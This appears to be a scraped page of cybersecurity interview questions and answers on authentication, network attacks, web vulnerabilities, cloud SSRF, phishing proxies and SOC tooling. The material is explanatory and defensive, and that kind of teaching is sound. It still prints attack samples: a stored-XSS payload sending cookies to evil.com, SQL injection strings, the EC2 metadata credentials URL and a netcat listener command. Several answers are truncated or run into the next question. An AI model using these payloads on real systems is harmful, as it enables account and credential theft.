1
What is the difference between NTLM and Kerberos authentication?
Easy▼

NTLM is a legacy challenge-response protocol. Server sends a challenge, client responds with the user's NT hash applied to the challenge. No central validation — each server verifies independently. Vulnerable to pass-the-hash attacks because an attacker with the hash can authenticate without the password.

Kerberos is the modern default. Client authenticates to the KDC (Domain Controller) and receives a Ticket Granting Ticket (TGT). To access a service, the client presents the TGT to get a service-specific TGS. The target server validates the TGS without ever seeing the password or hash. Single sign-on across services. Mutual authentication (client and server verify each other). Much more resistant to credential theft attacks.

2
What is a Golden Ticket attack and how is it detected?
Hard▼

A Golden Ticket is a forged Kerberos TGT created using the krbtgt account's NTLM hash. Because the KDC signs all TGTs with krbtgt, possessing this hash lets an attacker forge valid TGTs for any user, including fabricated users, with any group memberships, for any duration (even 10 years). This grants persistent, unlimited domain access even after passwords are reset — because the ticket is self-validating.

Detection: Golden Tickets often have impossible characteristics — ticket lifetimes exceeding the domain policy maximum (10 hours default), tickets for users that don't exist, or tickets with group memberships not matching the user's actual memberships. Monitor for Event ID 4769 (TGS requests) from accounts not recently authenticated via normal means. The definitive remediation is resetting krbtgt twice (to invalidate all outstanding tickets) — the second reset invalidates tickets created after the first reset using the old hash.

3
How would you harden an SSH configuration?
Medium▼

Key sshd_config changes: disable root login (PermitRootLogin no), disable password auth in favor of key-based auth (PasswordAuthentication no), disable empty passwords, disable rhosts/host-based auth, enable privilege separation (UsePrivilegeSeparation yes), restrict which users can SSH in (AllowUsers or AllowGroups), change default port from 22 (minor obscurity benefit), limit authentication attempts (MaxAuthTries 3), and set an idle timeout (ClientAliveInterval 300, ClientAliveCountMax 0).

Additionally: use fail2ban or similar to block brute-force attempts, rotate SSH keys regularly, use ed25519 or RSA-4096 key pairs (not DSA), configure firewall rules to limit SSH access to specific source IPs where possible, and monitor SSH authentication logs (/var/log/auth.log) for unusual patterns.

What is the SUID bit and why is it a privilege escalation risk?
Medium▼

The SUID (Set User ID) bit is a special Unix permission. When set on an executable, that program runs with the file owner's privileges rather than the executing user's privileges. Legitimate use: passwd is owned by root with SUID set, so regular users can change their own passwords (which requires writing to /etc/shadow, normally root-only).

Privilege escalation risk: if an attacker finds a SUID binary owned by root that has a vulnerability (command injection, path manipulation, library injection) or is writable, they can execute code with root privileges. Classic example: a SUID shell script that calls external commands without full paths — attacker manipulates PATH to make the shell execute a malicious binary instead. Find SUID files: find / -perm -4000 -user root 2>/dev/null. Any unexpected SUID binary, especially in user-writable locations, is a critical finding.

What is Active Directory and what are its core components?
Easy▼

Active Directory (AD) is Microsoft's directory service for Windows domain networks. It centralizes authentication and authorization for all domain-joined systems. Core components: Domain — logical group of objects (users, computers, groups) sharing a directory. Domain Controller (DC) — server running AD DS, stores the directory database, authenticates users. Forest — collection of domains with shared schema and configuration. Trust — relationship allowing authentication between domains. Organizational Unit (OU) — container within a domain for organizing objects and applying Group Policy.

Key concepts: FQDN (Fully Qualified Domain Name) identifies domain resources. Global Catalog — distributed data repository containing partial replica of all objects in the forest, enabling forest-wide searches. SID (Security Identifier) — unique identifier for every user, group, and computer. Group Policy — mechanism for enforcing configuration and security settings across all domain members. AD is a critical attack target because compromising a Domain Controller effectively compromises the entire organization.

Explain the OSI model and give an example of an attack at each layer.
Hard▼

L1 Physical: Cable cutting, jamming, hardware implants. L2 Data Link: ARP spoofing (MITM on LAN), MAC flooding (CAM table overflow turning switch into hub), VLAN hopping. L3 Network: IP spoofing, ICMP redirect attacks, BGP/OSPF route poisoning. L4 Transport: SYN flood (TCP DoS), session hijacking using predicted sequence numbers. L5 Session: Session fixation, session hijacking. L6 Presentation: SSL stripping, malformed SSL/TLS attacks. L7 Application: SQL injection, XSS, buffer overflow in application logic, phishing.

The key insight interviewers want: attacks at lower layers affect all higher-layer traffic passing through. An L2 ARP spoof lets you intercept L7 HTTP traffic. Understanding which layer an attack targets helps select the right defensive control.

2
What is a SYN flood and how do SYN cookies defend against it?
Medium▼

A SYN flood sends massive numbers of TCP SYN packets to a target server, often with spoofed source IPs. The server allocates resources for each half-open connection (waiting for the final ACK), stores them in a backlog queue, and waits for completion. The attacker never sends the final ACK, so the half-open connections accumulate until the backlog is exhausted. New legitimate connections are then refused.

SYN cookies: instead of storing state for each SYN, the server encodes the connection information into the initial sequence number (the SYN-ACK). If the client completes the handshake with a valid ACK (containing data derived from the cookie), the server reconstructs the state at that point. Legitimate clients always complete the handshake. Attackers using spoofed IPs never receive the SYN-ACK and can't respond. This allows the server to handle massive SYN floods without exhausting memory.

What is the difference between TCP and UDP, and when would you use each?
Easy▼

TCP (Transmission Control Protocol) is connection-oriented. It establishes a connection via 3-way handshake, guarantees delivery and order of packets, performs flow control and congestion control, and detects/retransmits lost packets. Use TCP when data integrity matters: web (HTTP/HTTPS), email (SMTP), file transfers (FTP), remote access (SSH).

UDP (User Datagram Protocol) is connectionless — no handshake, no delivery guarantee, no ordering, no retransmission. Just sends packets as fast as possible. Use UDP when speed matters more than perfect delivery: DNS lookups, streaming video/audio (a dropped frame is better than delayed playback), VoIP, online gaming, DHCP. Security note: UDP's stateless nature makes it harder to track for stateful firewalls and used in amplification DDoS attacks (small UDP request → large response sent to spoofed victim IP).

4
Explain BGP hijacking and why it's dangerous.
Hard▼

BGP (Border Gateway Protocol) is the routing protocol that governs how traffic moves between autonomous systems (AS) on the internet. It fundamentally trusts route announcements — any AS can announce that it owns any IP prefix. BGP hijacking occurs when a malicious (or misconfigured) AS announces false ownership of IP prefixes it doesn't control. Other routers, following BGP's preference for more specific routes or shorter paths, update their routing tables to send traffic through the attacker's AS.

Why it's dangerous: traffic intended for a bank or government site can be redirected to an attacker who can then: eavesdrop (if not encrypted), perform MITM attacks on TLS by presenting fraudulent certificates, drop traffic (DoS), or manipulate content. Historical examples: the Pakistan Telecom/YouTube incident (2008), where Pakistan's route blackholing accidentally propagated globally. BGPsec and RPKI (Resource Public Key Infrastructure) are designed to cryptographically verify route ownership, but adoption is still incomplete globally.

What does /24 mean in CIDR notation and how many hosts can it have?
Easy▼

/24 means the first 24 bits of the IP address are the network portion, and the remaining 8 bits are for host addresses. Example: 192.168.1.0/24 = network 192.168.1.x. With 8 host bits: 2^8 = 256 total addresses. Subtract 2 (network address 192.168.1.0 and broadcast address 192.168.1.255) = 254 usable host addresses.

Common CIDR: /8 = Class A (~16M hosts), /16 = Class B (~65K hosts), /24 = Class C (254 hosts), /30 = point-to-point link (2 hosts), /32 = single host. Subnetting divides a larger network into smaller segments. For example, 192.168.0.0/22 covers 192.168.0.0 through 192.168.3.255 = 1022 hosts. Understanding subnetting is essential for network segmentation (PCI-DSS, isolating cardholder data environments) and firewall rule scoping.

1
What is SQL injection and how do parameterized queries prevent it?
Easy▼

SQL injection occurs when user-supplied input is incorporated directly into a SQL query, allowing the attacker to modify the query's logic. Example: if a login query is built as "SELECT * FROM users WHERE username='" + input + "'", an attacker inputs ' OR '1'='1 to make the condition always true and bypass authentication.

Parameterized queries solve this by separating SQL code from data. The query structure is sent to the database first: "SELECT * FROM users WHERE username = ?". The database compiles and understands this as a fixed query structure. Then the user input is bound as a pure data value. The database treats it as a literal string — no matter what SQL syntax the attacker includes, it's evaluated as data, never as code. The ' OR '1'='1 input would literally search for a username equal to that exact string.

2
Explain the difference between union-based and blind SQL injection.
Medium▼

Union-based SQLi extracts data directly in the response. The attacker appends a UNION SELECT statement that fetches data from other tables, and this data appears in the application's output. Requirement: must know/guess the number of columns and compatible data types. Fast but requires visible output from the vulnerable query.

Blind SQLi receives no direct data output. Boolean-based: attacker asks true/false questions — ' AND 1=1-- (true condition, normal response) vs ' AND 1=2-- (false condition, different response). By asking questions about specific data (is the first character of the admin password 'a'?), the attacker extracts data character by character. Slow but works against queries with no visible output. Time-based blind: inject SLEEP(5) in a condition — if the response takes 5 extra seconds, the condition was true. Works even when boolean detection fails.

3
What ACID property is most important for financial transactions and why?
Easy▼

Atomicity is arguably most important for financial transactions — it guarantees that a transaction either completes entirely or not at all. Consider a bank transfer: debit Account A and credit Account B. If the system crashes after the debit but before the credit, Atomicity ensures the debit is rolled back. Without it, money disappears from Account A without arriving in Account B.

However, all four ACID properties are critical: Consistency ensures the database stays in a valid state (account balance can't go below 0 if that's a business rule). Isolation ensures concurrent transactions don't interfere — two simultaneous withdrawals from the same account can't both read the same balance and both succeed if there's only enough for one. Durability guarantees committed transactions survive system failures — after the bank confirms a deposit, a server crash doesn't lose it. In practice, financial systems often use all four properties together, accepting performance trade-offs for correctness guarantees.

What is STRIDE and how is it used in threat modeling?
Easy▼

STRIDE is a threat categorization framework developed by Microsoft for identifying security threats during the design phase. Each letter represents a threat category: Spoofing (forging identity — pretending to be someone else), Tampering (modifying data in transit or at rest), Repudiation (denying having performed an action — lack of audit trail), Information Disclosure (unauthorized data exposure), Denial of Service (making the system unavailable), Elevation of Privilege (gaining more permissions than authorized).

Usage: for each component in a system's data flow diagram (DFD), systematically ask whether each STRIDE threat applies. For a login endpoint: Spoofing (can someone impersonate another user?), Tampering (can the login request be modified?), Repudiation (do we log who logged in?), Information Disclosure (does the error message reveal valid usernames?), DoS (can the login endpoint be flooded?), EoP (can a normal user gain admin access?). This structured approach ensures no threat category is overlooked during design review.

2
What is the difference between SAST, DAST, and IAST?
Medium▼

SAST (Static Application Security Testing) analyzes source code, bytecode, or binary without executing the program. Runs during development — can catch issues before code even compiles. Finds: hardcoded secrets, SQL injection patterns, buffer overflow risks, insecure API usage. Tools: SonarQube, Checkmarx, Bandit. Fast, early feedback, but can't see runtime behavior.

DAST (Dynamic Application Security Testing) tests a running application by sending requests and analyzing responses. Finds: authentication bypass, live injection points, server misconfigurations, session issues. Tools: OWASP ZAP, Burp Suite. Catches issues only visible at runtime, no source code needed, but slower and runs later in the pipeline.

IAST (Interactive Application Security Testing) instruments agents inside the running application to monitor all interactions in real time. Combines static depth with dynamic execution context — knows exactly which code line is executing when a vulnerability is triggered. More accurate, fewer false positives, but adds performance overhead. Tools: Contrast Security, Seeker. Used in staging/QA environments where performance overhead is acceptable.

3
Walk through the phases of a penetration test.
Medium▼

Reconnaissance: Gather information about the target without touching their systems. OSINT — LinkedIn profiles, job postings (reveal tech stack), WHOIS, Shodan, Google dorking, certificate transparency logs. Scanning: Active information gathering — Nmap port scanning, service version detection, OS fingerprinting, vulnerability scanning (Nessus, OpenVAS). Exploitation: Attempt to exploit discovered vulnerabilities. Use Metasploit modules, custom exploits, or manual techniques. Goal is gaining initial access. Post-exploitation: Once inside — escalate privileges, move laterally, maintain access (backdoors, persistence mechanisms), collect evidence (credentials, sensitive files), understand the blast radius. Reporting: Document everything — executive summary (business impact, risk ratings), technical findings (vulnerability details, evidence, reproduction steps), and remediation recommendations prioritized by risk. Distinguish findings by severity (Critical/High/Medium/Low/Informational) using CVSS scores.

What is the difference between stored, reflected, and DOM-based XSS?
Medium▼

Stored XSS: Malicious script is permanently stored on the server (database, comment field, profile data). Every user who views the affected page executes the script. Most dangerous — no user interaction beyond visiting the page. Example: attacker stores <script>document.location='http://evil.com/steal?c='+document.cookie</script> in a forum comment field.

Reflected XSS: Malicious script is in the URL/request parameter and reflected back in the response without being stored. Requires tricking the victim into clicking a crafted link. Example: attacker sends link like https://bank.com/search?q=<script>...</script>. Affects only users who click the specific malicious URL.

DOM-based XSS: Vulnerability exists entirely in client-side JavaScript. The server's response is not malicious, but client code reads attacker-controlled input (URL hash, query parameters) and writes it unsafely to the DOM. Example: script reads window.location.hash and passes it to innerHTML. Server logs show no malicious content — the attack is invisible to server-side logging. Prevention: validate and sanitize at the DOM API level (textContent instead of innerHTML).

2
What is SSRF and how is it used to access AWS EC2 metadata?
Hard▼

SSRF (Server-Side Request Forgery) occurs when an application fetches a remote resource based on user-supplied input without adequate validation. The attacker supplies an internal or cloud-specific URL, and the application's server makes the request on their behalf — from the server's network perspective, not the attacker's.

AWS EC2 metadata attack: EC2 instances have a non-routable metadata endpoint at 169.254.169.254, accessible only from the instance itself. If an application has an SSRF vulnerability (URL fetching, PDF generation, webhook), the attacker submits: http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server fetches this URL and returns the IAM role credentials (access key ID, secret key, session token) that the instance was assigned. These temporary credentials can then be used to call AWS APIs with the instance's permissions — potentially including S3 data access, EC2 control, or worse. Mitigation: IMDSv2 (requires a PUT request with a token before GET requests, preventing SSRF exploitation), allowlist of valid destination URLs, block internal IP ranges in the URL fetching code.

3
Why is Broken Access Control ranked #1 in OWASP 2021?
Medium▼

Broken Access Control moved to #1 in 2021 (from #5 in 2017) because it's both extremely prevalent and extremely impactful. 94% of applications tested had at least one broken access control finding — making it the most common vulnerability category. More importantly, when access control fails, attackers can access sensitive data and perform actions beyond their authorization, which is the fundamental failure security is designed to prevent.

Common manifestations: IDOR (Insecure Direct Object Reference) — changing ?user_id=1234 to ?user_id=1235 to access another user's data. Missing function-level access control — accessing /admin endpoint without checking if the user is actually an admin. Privilege escalation — a regular user performing admin actions by modifying request parameters. Force browsing — accessing unlinked pages that lack authorization checks. Path traversal reaching protected files. The reason it's pervasive: developers often implement authentication (proving identity) but forget or under-implement authorization (proving permission). Every API endpoint, every page, every action must individually verify that the authenticated user has permission to perform that specific operation on that specific resource.

What is the difference between a reverse shell and a bind shell?
Easy▼

A bind shell: the victim machine opens a port and listens for an incoming connection. The attacker connects to that port and gets a shell. Requires the attacker to be able to reach the victim's open port — often blocked by inbound firewall rules that restrict which ports can receive connections from the internet.

A reverse shell: the victim machine initiates the connection back to the attacker's machine on a port the attacker is listening on. Outbound connections are typically much less restricted than inbound — most firewalls allow outbound traffic on common ports (80, 443, 53). Since the victim is initiating the connection, the attacker just needs to be listening. Most pentests and real-world attacks use reverse shells for this reason. The attacker runs a listener (nc -lvnp 4444 or use MSF multi/handler) and delivers a payload that causes the victim to connect back. Common ports to use: 443 (HTTPS) or 80 (HTTP) are least likely to be blocked and blend in with normal traffic.

What is the shared responsibility model in cloud computing?

How does EC2 Instance Metadata SSRF work and how is it mitigated?
Hard▼

Every EC2 instance can access its own metadata via a non-routable link-local address (169.254.169.254). This service provides instance details, user-data scripts, and most critically, temporary IAM credentials for any IAM role attached to the instance. These endpoints are accessible without authentication from the instance itself.

The SSRF attack: if an application running on EC2 has an SSRF vulnerability (fetches a URL based on user input), an attacker submits: http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server (which is the EC2 instance) fetches this URL and returns the JSON response containing AccessKeyId, SecretAccessKey, and Token. The attacker now has temporary AWS credentials and can make API calls with whatever permissions the EC2 role has — potentially S3 data access, EC2 manipulation, or privilege escalation to other roles. Mitigation: IMDSv2 (Instance Metadata Service v2) requires a two-step process: first, a PUT request to get a session token, then use that token in the GET request. PUT requests cannot be made by typical SSRF vulnerabilities (they require a specific Content-Type header and are often blocked by server-side HTTP clients). Enforce IMDSv2 in instance configuration. Additionally: restrict EC2 IAM roles to minimum necessary permissions, monitor for unusual EC2 metadata API calls in CloudTrail, use VPC endpoint policies to restrict S3 access.

How does Evilginx bypass MFA and what defensive measures work against it?
Hard▼

Evilginx operates as a reverse proxy between the victim's browser and the legitimate service. The attacker registers a convincing phishing domain (microsofft.com instead of microsoft.com) and configures Evilginx with phishlets (templates for specific sites). The victim clicks a phishing link, lands on Evilginx's proxy, and sees the legitimate site's actual content (because Evilginx fetches it in real time). The victim enters credentials and completes MFA — TOTP code, push notification, SMS code — all of which Evilginx forwards to the real site. After successful authentication, the real site returns a session cookie to Evilginx's proxy, which captures it before forwarding to the victim's browser. The attacker now has the authenticated session cookie and can impersonate the user without needing credentials or MFA.

Why standard MFA fails: TOTP codes, SMS codes, and push notifications all validate the real session that Evilginx completed — they don't protect the resulting session token. Defenses that work: FIDO2/WebAuthn hardware keys (YubiKey) are phishing-resistant — they bind the authentication to the legitimate domain using origin checking. If the origin doesn't match, the key refuses to respond. Conditional Access policies that evaluate device compliance, location, and risk scores can detect anomalous sessions even with valid cookies. Short-lived session tokens with continuous re-authentication requirements limit the useful window of a stolen cookie.

What is the difference between a red team engagement and a penetration test?
Medium▼

Red team engagements simulate realistic, targeted adversaries with a specific objective (compromise crown jewel systems, exfiltrate specific data). The blue team is NOT told — testing their actual detection and response capability is a primary goal. The red team uses the full kill chain: OSINT, social engineering, physical access attempts, phishing campaigns — not just technical exploitation. The red team intentionally avoids triggering detections when possible (stealth is valued). Objectives-based: success means reaching the goal, not finding every vulnerability. Duration: weeks to months. Output: attack narrative showing the realistic threat, detection gaps, and dwell time analysis. Why is deleting a secret from git insufficient — and what's the right remediation?
Medium▼

Git is designed to never truly forget. Every commit is permanently recorded in the repository's history. When you delete a file in a new commit, the original commit containing the secret still exists in the history — accessible to anyone who runs git log and git show. Automated bots scan public repositories continuously; a secret committed even briefly to a public repo has likely been captured before deletion.

The correct response has two parts: Immediately rotate/revoke the exposed credential — assume it's already compromised. This is the most critical step. What is Perfect Forward Secrecy and why did Heartbleed make it critical?
Medium▼

PFS is a property ensuring that past communication sessions remain secure even if a server's long-term private key is later compromised. Achieved using ephemeral key exchange (ECDHE): a fresh, temporary key pair is generated for each session. The session key is derived from this exchange — the server's long-term private key is only used for authentication, not for encrypting session data. After the session ends, ephemeral keys are deleted.

Without PFS: classic TLS used RSA key exchange — client encrypted a pre-master secret with the server's public key; server decrypted with its private key. If an attacker recorded encrypted traffic and later obtained the private key (via Heartbleed, which read server private keys from OpenSSL memory), they could retroactively decrypt all previously captured sessions. Heartbleed was a memory disclosure bug allowing attackers to repeatedly read 64KB chunks of server memory, potentially extracting private keys, session tokens, and passwords. With PFS: even with the private key stolen via Heartbleed, the ephemeral session keys were generated separately, were never stored, and are gone. The recorded encrypted traffic cannot be decrypted. This is why TLS 1.3 mandates PFS and removed all non-PFS cipher suites.

What is Living off the Land (LotL) and why is it hard to detect?
Medium▼

LotL refers to attackers using tools already present on the victim's system — legitimate Windows utilities — rather than introducing new malware binaries. Common tools: PowerShell (scripting, download/execute, credential harvesting via Invoke-Mimikatz), WMI (persistence, remote code execution), certutil (file download), mshta (execute remote scripts), regsvr32 (code execution), WMIC (enumeration, lateral movement). No new files = no file hashes for AV to match, no new executables for whitelisting to block.

Why it's hard to detect: PowerShell, cmd.exe, and WMI are whitelisted by default on virtually every Windows system — they're legitimate administrative tools. The malicious activity blends with normal usage. A network admin legitimately uses PowerShell for remote management; an attacker using PowerShell for lateral movement looks similar in basic logs. Detection requires behavioral analysis: knowing that PowerShell should not be spawned by Office documents, that Invoke-Mimikatz patterns represent credential harvesting, or that certutil downloading from an external IP is unusual for standard users. Mitigations: PowerShell script block logging (captures commands even encoded), transcription logging, execution policy with AppLocker enforcement, monitoring WMI subscription creation events.

Capture memory dump before shutdown. Begin IR: document timeline, check all endpoints communicating with that IP, review authentication logs from the host.

Why is EDR + SIEM integration considered best practice rather than either alone?
Hard▼

EDR sees deep but narrow — rich telemetry from individual endpoints (process creation, file access, memory operations) but limited to devices where deployed. Doesn't natively see network traffic between systems, server-side logs, cloud activity, or email gateway events. SIEM sees wide but shallow — aggregates logs from firewalls, servers, cloud, email, endpoints — but events are lower resolution than EDR telemetry.

Together: EDR detects anomalous PowerShell execution on a workstation and sends the alert with full process telemetry to the SIEM. The SIEM correlates with: firewall logs showing outbound connections to the same IP from three other workstations, email gateway logs showing a phishing email delivered to all four users two hours earlier. The SIEM now has the full picture — phishing campaign affecting multiple users — rather than four separate unrelated endpoint alerts. Integration also powers automated response: SIEM creates high-priority incident, automatically triggers EDR playbook to isolate all four endpoints, creates firewall rule to block the C2 IP — before a human analyst starts investigating. Neither tool alone would have connected these events into a campaign-level picture.

What is event correlation in a SIEM and why is it more powerful than individual logs?
Easy▼

Event correlation links related security events from multiple disparate sources to identify attack patterns invisible when each log is viewed in isolation. Most attacks leave evidence in multiple systems simultaneously, but no single system sees the full picture.

Classic example: firewall logs show 500 failed SSH attempts from IP 1.2.3.4 (suspicious but alone = possibly misconfigured system). Authentication server shows successful SSH login from same IP immediately after (concerning but alone = could be legitimate). File system logs show a large archive created in /tmp (suspicious alone = could be backup). Correlated: SIEM raises critical alert — "brute force succeeded, data staging for exfiltration." Another example: "impossible travel" — user authenticates from New York at 9am and London at 10am. Neither login is individually suspicious (both succeed). SIEM correlation on timing + geolocation = impossible travel alert. This is why SIEM is the central tool for SOC analysts — the correlation capability surfaces attacks that would never be detected reviewing individual system logs.

Why is defense in depth more effective than relying on a single security control?
Easy▼

Any single security control can fail — a firewall can be misconfigured, AV can miss a new malware strain, a developer can forget to validate a specific input. If you rely on only one control, its failure equals complete compromise.

With defense in depth, the attacker must successfully defeat every layer to achieve their objective. Kill Chain 1 illustrates this: the attacker succeeded because multiple layers failed simultaneously — no secrets scanning, no environment segregation, no network ACLs, no credential rotation. If even one had been in place, the chain would have broken. In practice, defense in depth across typical environments includes: network perimeter (firewall/WAF), network segmentation (VLANs), endpoint protection (EDR), application security (input validation, parameterized queries), identity (MFA, RBAC, least privilege), data protection (encryption at rest and in transit), monitoring and detection (SIEM, IDS/IPS), and incident response. No individual layer needs to be perfect — you need enough layers that defeating all of them exceeds the attacker's motivation and resources.

What are the three types of HIPAA Security Rule safeguards with examples?
Medium▼

Administrative safeguards — policies, procedures, and management activities protecting ePHI. Why is compliance not the same as security?
Hard▼

Compliance and security are related but fundamentally different. Compliance means meeting the minimum requirements of a specific standard at a specific point in time. Security means actually protecting systems from threats in an ongoing, adaptive manner. The most powerful evidence: Target was PCI-DSS compliant when 40 million credit card numbers were stolen via an HVAC vendor's network access. Being compliant provided no protection. Compliance is point-in-time — a company that passes its annual QSA assessment may be breached six months later due to a new vulnerability or misconfiguration introduced after the audit.

Compliance standards are generic by necessity — they must apply to every organization in scope. A healthcare system and a one-doctor practice both must comply with HIPAA, but their threat profiles differ enormously. Compliance encourages minimum viable security — organizations implementing only what's needed to pass the audit. This checkbox security mentality creates a false sense of protection. Other examples: Marriott, Equifax, Capital One were all compliant with relevant standards near the time of their major breaches. The correct relationship: compliance is a floor, not a ceiling. Use compliance as a structured baseline, then conduct threat modeling specific to your environment, implement controls based on actual risk profile, and continuously improve based on the evolving threat landscape — not just the annual compliance calendar.

What are the key differences between GDPR and CCPA?
Medium▼

Scope: GDPR applies globally to any organization processing EU residents' personal data — no size threshold. CCPA specifically focuses on the right to opt out of data sale — a right GDPR doesn't have in the same framing. GDPR is generally considered stricter across every dimension. CCPA has inspired similar laws in 10+ US states, trending toward GDPR-like opt-in requirements.

What is Scapy and why is it useful for security professionals?

Why is PowerShell so frequently used in modern cyberattacks?
